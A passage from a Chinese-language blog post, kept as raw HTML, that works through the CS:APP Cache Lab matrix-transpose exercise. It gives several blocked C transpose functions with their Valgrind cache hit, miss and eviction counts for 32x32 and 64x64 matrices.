number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>x7<span class="token punctuation">;</span>                   B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>x8<span class="token punctuation">;</span>                               <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span>             <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span> m<span class="token operator">=</span>i<span class="token punctuation">;</span>m<span class="token operator">&lt;</span><span class="token number">8</span><span class="token operator">+</span>i<span class="token punctuation">;</span>m<span class="token operator">++</span><span class="token punctuation">)</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span> n<span class="token operator">=</span>j<span class="token punctuation">;</span>n<span class="token operator">&lt;</span><span class="token number">8</span><span class="token operator">+</span>j<span class="token punctuation">;</span>n<span class="token operator">++</span><span class="token punctuation">)</span>                    B<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Miss数为287个,达到满分标准</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023797.png" alt="image-20240312103528506"></p><h3 id="最简优化思路"><a href="#最简优化思路" class="headerlink" title="最简优化思路"></a>最简优化思路</h3><p>但是理论值256?(32*4*2&#x3D;256不包括Valgrind模拟产生的开销),可以考虑再优化.</p><p>我们想想,还有哪里会消耗呢?色块已经到上限了,那还是继续考虑对角线上的块.我们考虑到,每次我们都是这样做的,模拟下流程:</p><p>Load A[1]</p><p>Load B[1-8]—&gt;evict A[1]</p><p>Load A[2]  —&gt;evict B[2]</p><p>Load B[2]  —&gt;evict A[2]</p><p>…</p><p>Load A[7]  —&gt;evict B[7]</p><p>Load B[7]  —&gt;evict A[7]</p><p>Load A[8]  —&gt;evict B[8]</p><p>Load B[8]  —&gt;evict A[8]</p><p>有没有什么办法可以减少evict的次数呢?有两种可能</p><ul><li>Load A[i] 前 Load B[i]</li><li>Load B[i] 前 Load A[i]</li></ul><p>第一种pass,毕竟a是原数组,所以有没有办法把A[i]的值先放起来,再之后再Load对应的B[i]呢,我们发现,A的每一行只会load一遍,所以啊我们只用把A的那一行都用寄存器存起来后再把B对应的那一行load进去,相当于一行一行的把A复制到B中,最后所有的B都加载到缓存中了,再借助一个中间变量转置就好了,简单易懂!</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> trans_3_desc<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"进行8*8的分块,并且优化对角线,逼近极限"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">trans_3</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span><span class="token keyword">int</span> N <span class="token punctuation">,</span><span class="token keyword">int</span> A<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>m<span class="token punctuation">,</span>n<span class="token punctuation">,</span>x1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>x3<span class="token punctuation">,</span>x4<span class="token punctuation">,</span>x5<span class="token punctuation">,</span>x6<span class="token punctuation">,</span>x7<span class="token punctuation">,</span>x8<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>j<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>m<span class="token operator">=</span>i<span class="token punctuation">;</span>m<span class="token operator">&lt;</span><span class="token number">8</span><span class="token operator">+</span>i<span class="token punctuation">;</span>m<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    x1<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>x2<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x3<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x4<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x5<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x6<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x7<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x8<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    B<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>x1<span class="token punctuation">,</span>B<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>x2<span class="token punctuation">,</span>B<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>x3<span class="token punctuation">,</span>B<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>x4<span class="token punctuation">,</span>B<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span>x5<span class="token punctuation">,</span>B<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span>x6<span class="token punctuation">,</span>B<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span>x7<span class="token punctuation">,</span>B<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span>x8<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token comment">//复制</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>m<span class="token operator">=</span>i<span class="token punctuation">;</span>m<span class="token operator">&lt;</span><span class="token number">8</span><span class="token operator">+</span>i<span class="token punctuation">;</span>m<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span>n<span class="token operator">=</span>j<span class="token punctuation">;</span>n<span class="token operator">&lt;</span>j<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">;</span>n<span class="token operator">++</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token operator">&lt;=</span>n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    x1<span class="token operator">=</span>B<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>                    B<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">=</span>B<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">;</span>                    B<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>x1<span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>           <span class="token comment">//原地转置</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>             <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span> m<span class="token operator">=</span>i<span class="token punctuation">;</span>m<span class="token operator">&lt;</span><span class="token number">8</span><span class="token operator">+</span>i<span class="token punctuation">;</span>m<span class="token operator">++</span><span class="token punctuation">)</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span> n<span class="token operator">=</span>j<span class="token punctuation">;</span>n<span class="token operator">&lt;</span><span class="token number">8</span><span class="token operator">+</span>j<span class="token punctuation">;</span>n<span class="token operator">++</span><span class="token punctuation">)</span>                    B<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试结果如下:</p><pre class="line-numbers language-none"><code class="language-none">hits:2242, misses:259, evictions:227<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Phase-2-64-64"><a href="#Phase-2-64-64" class="headerlink" title="Phase_2:64*64"></a>Phase_2:64*64</h2><h3 id="正常解法"><a href="#正常解法" class="headerlink" title="正常解法"></a>正常解法</h3><p>矩阵长宽各变成32*32的一倍,那简单,我们直接把之前做的矩阵优化丢进去一测试,完蛋!</p><pre class="line-numbers language-none"><code class="language-none">func 0 (Simple row-wise scan transpose): hits:3474, misses:4723, evictions:4691func 2 (进行8*8的分块,并且优化对角线): hits:3586, misses:4611, evictions:4579<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>相较于给定的朴素函数竟然只有这么点提升,怎么回事呢?我们直接将把路径跟踪一下,不得了</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023839.png" alt="image-20240312112124338"></p><p>怎么会有这么多个miss eviction呢?一看地址,发现A load是没问题的,但是B Store就出现了问题,每次的后四个块地址就映射到前四个块的地址了,这小陷阱竟然被我发现了(逃,所以我们初步想一想是不是该进行8*4的分块来进行操作呢,说办就办</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> trans_4_desc<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"64*64的矩阵,思考分块8*4"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">trans_4</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span><span class="token keyword">int</span> N<span class="token punctuation">,</span><span class="token keyword">int</span> A<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>m<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>j<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>m<span class="token operator">=</span>i<span class="token punctuation">;</span>m<span class="token operator">&lt;</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">;</span>m<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>n<span class="token operator">=</span>j<span class="token punctuation">;</span>n<span class="token operator">&lt;</span>j<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">;</span>n<span class="token operator">++</span><span class="token punctuation">)</span>    B<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很快的得到了miss为</p><pre class="line-numbers language-(空)" data-language="(空)"><code class="language-(空)">hits:6354, misses:1843, evictions:1811<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那是不是还要再优化一下对角线呢?这不太好优化,先想想满分是1300miss,我们采取8*4的块,这样子有点抽象,存在后四位数字用不到的情况,所以我们采取4*4试一试</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> trans_5_desc<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"64*64的矩阵,思考分块4*4"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">trans_5</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span><span class="token keyword">int</span> N<span class="token punctuation">,</span><span class="token keyword">int</span> A<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>x<span class="token punctuation">,</span>x1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>x3<span class="token punctuation">,</span>x4<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>j<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>x<span class="token operator">=</span>i<span class="token punctuation">;</span>x<span class="token operator">&lt;</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">;</span>x<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        x1<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>x2<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x3<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x4<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>x1<span class="token punctuation">,</span>B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>x2<span class="token punctuation">,</span>B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>x3<span class="token punctuation">,</span>B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>x4<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以得到以下结果</p><pre class="line-numbers language-(空)" data-language="(空)"><code class="language-(空)">hits:6498, misses:1699, evictions:1667<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1699miss,看来想单纯考分块是不能过关的,所以只好继续思考8*4分块的优化方式,因为采取4*4分块的话,每一次Load A 在8*4分块中只需要一次,但在4*4中要两次,44分块的不足之处还是太严重了,所以只能继续思考8*4的分块方式,看能不能想象办法优化一下.</p><p>再想一想B的Store的顺序分别为:</p><p>前四行前四列–&gt;后四行前四列—&gt;前四行后四列—&gt;后四行后四列,所以得想个办法让B先不跳转到后四行,👍</p><p>在这里要引用这个<a href="https://blog.csdn.net/xbb224007/article/details/81103995">链接</a>,他讲的真心不错,图文并茂.</p><p>这是我们要转置的区域,虽然我们想8*4的转置,但还是建立在8*8的区域上面去转置的,画图真的能帮助分析理解,为了尽量减少冲突造成的miss,毕竟考虑到对角线的各种映射冲突导致的miss,我们尽量在读完一行后不再读它,所以每次用8个x来最大可能地保存值,从而让miss数尽可能的低</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023885.png" alt="image-20240312121524725"></p><p>所以为了不再访问前四行,我们把那些元素都取出来,顺便把元素提前转置了,之后直接平移就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023933.png" alt="image-20240312121624903"></p><p>有八个局部变量,所以我们先把{1}位置四个值存起来,然后把{2}位置的值丢进去,然后就可以不读这一行了,读第五行然后把存下来的关于{1}的值平移下去,重复四遍这种行为就好了.</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023975.png" alt="image-20240312201713022"></p><p>最后再转置后四行的后四列,这就是常规转置了,合理利用8个局部变量.</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023019.png" alt="image-20240312121719152"></p><p>当然我们在这里还是可以考虑对角线原地转置导致的miss,但对于一个8*4的块来说还是比较复杂的,等我以后牛逼了再来讨论(2024.3.12)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> trans_6_desc<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"64*64的矩阵,思考分块8*8下以8*4为小块进行转置"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">trans_6</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span><span class="token keyword">int</span> N<span class="token punctuation">,</span><span class="token keyword">int</span> A<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>x1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>x3<span class="token punctuation">,</span>x4<span class="token punctuation">,</span>x5<span class="token punctuation">,</span>x6<span class="token punctuation">,</span>x7<span class="token punctuation">,</span>x8<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>j<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token comment">//开始讨论一个8*8的分块,先把前8*4中的4*4先转置,然后再把后4*4挪到转置</span>                <span class="token comment">//块里的前8*4的后4*4分块中</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>x<span class="token operator">=</span>i<span class="token punctuation">;</span>x<span class="token operator">&lt;</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">;</span>x<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                 <span class="token comment">//x1-x4负责正常的转置即前四行前四列</span>                    <span class="token comment">//x5-x8负责前四行后四列的提前转置</span>                    x1<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>x2<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x3<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x4<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    x5<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x6<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x7<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x8<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>x1<span class="token punctuation">,</span>B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>x2<span class="token punctuation">,</span>B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>x3<span class="token punctuation">,</span>B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>x4<span class="token punctuation">;</span>                    B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span>x5<span class="token punctuation">,</span>B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span>x6<span class="token punctuation">,</span>B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span>x7<span class="token punctuation">,</span>B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span>x8<span class="token punctuation">;</span>                                    <span class="token punctuation">&#125;</span>                <span class="token comment">//把后四行前四列转置,同时把提前转置的平移过去</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>y<span class="token operator">=</span>j<span class="token punctuation">;</span>y<span class="token operator">&lt;</span>j<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">;</span>y<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    x1<span class="token operator">=</span>A<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span>x2<span class="token operator">=</span>A<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span>x3<span class="token operator">=</span>A<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span>x4<span class="token operator">=</span>A<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">;</span>                    x5<span class="token operator">=</span>B<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x6<span class="token operator">=</span>B<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x7<span class="token operator">=</span>B<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x8<span class="token operator">=</span>B<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    B<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span>x1<span class="token punctuation">,</span>B<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span>x2<span class="token punctuation">,</span>B<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token 